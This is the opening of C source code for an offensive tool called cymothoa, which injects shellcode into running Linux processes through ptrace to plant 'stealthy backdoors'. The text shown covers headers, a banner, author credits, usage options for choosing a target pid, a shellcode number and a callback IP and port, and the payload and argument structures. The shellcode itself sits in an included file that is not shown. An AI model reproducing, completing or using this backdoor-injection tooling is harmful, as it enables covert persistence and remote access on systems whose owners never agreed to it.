#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>


char banner[] =
"                              _                 \n\
                          _  | |                \n\
  ____ _   _ ____   ___ _| |_| |__   ___  _____ \n\
 / ___) | | |    \\ / _ (_   _)  _ \\ / _ \\(____ |\n\
( (___| |_| | | | | |_| || |_| | | | |_| / ___ |\n\
 \\____)\\__  |_|_|_|\\___/  \\__)_| |_|\\___/\\_____|\n\
      (____/  ";

char info[] = "Runtime shellcode injection, for stealthy backdoors...\n\n"
              "By codwizard (codwizard@gmail.com) and crossbower (crossbower@gmail.com)\n"
              "from ES-Malaria by ElectronicSouls (http://www.0x4553.org).";

char gretz[] = "Gretz: brigante, emgent, scox, keeley, fiocinino...\n"
               "       ...and backtrack-italy community ;)";

char usage_text[] = "\nUsage:\n"
                    "\tcymothoa -p <pid> -s <shellcode_number> [options]\n\n"
                    "Main options:\n"
                    "\t-p\tprocess pid\n"
                    "\t-s\tshellcode number\n"
                    "\t-l\tmemory region name for shellcode injection (default /lib/ld)\n"
                    "\t  \tsee /proc/pid/maps...\n"
                    "\t-h\tprint this help screen\n"
                    "\t-S\tlist available shellcodes\n\n"
                    "Payload personalization options:\n"
                    "\t-x\tset the IP (def 65.65.65.65)\n"
                    "\t-y\tset the port number (def 16962)\n"
                    "\t-z\tset the username (4 bytes) (def CCCC)\n"
                    "\t-o\tset the password (4 bytes) (def DDDD)\n"
                    "\t-i\tset the interpreter (def /bin/bash)\n"
                    "\t-c\tset the script code (from cmd line)\n"
                    "\t-C\tset the script code (load from file)\n";


// STRUCTURES:

// payload structure
struct payload {
    char *description;
    char *shellcode;
};

// arguments structure
struct arguments {
    
    // standard arguments:
    pid_t pid;           // process pid
    int payload_index;   // the selected payload
    char *lib_name;      // library region where to put the shellcode
    
    // payload personalization options:
    uint32_t my_ip;      // our ip address
    uint16_t my_port;    // our port number
    char *my_username;   // our username
    char *my_password;   // our password
    char *interpreter;   // script interpreter
    char *perl_code;     // perl code
    char *perl_file;     // perl script file

    // actions
    int show_help:1;     // show the help/usage screen
    int show_payloads:1; // show the list of payloads

} args;

char *sh_buffer = NULL;

int payload_len;
int payload_count;

#include "payloads.h"

#include "personalization.h"

// ARCHITECTURAL DEFINES

// 32 bit
#ifdef linux_x86

// stack push size
#define BLOCK_SIZE 4

// registers
#define AX eax
#define BX ebx
#define INST_POINTER  eip
#define STACK_POINTER esp

#endif

#ifdef bsd_x86
#endif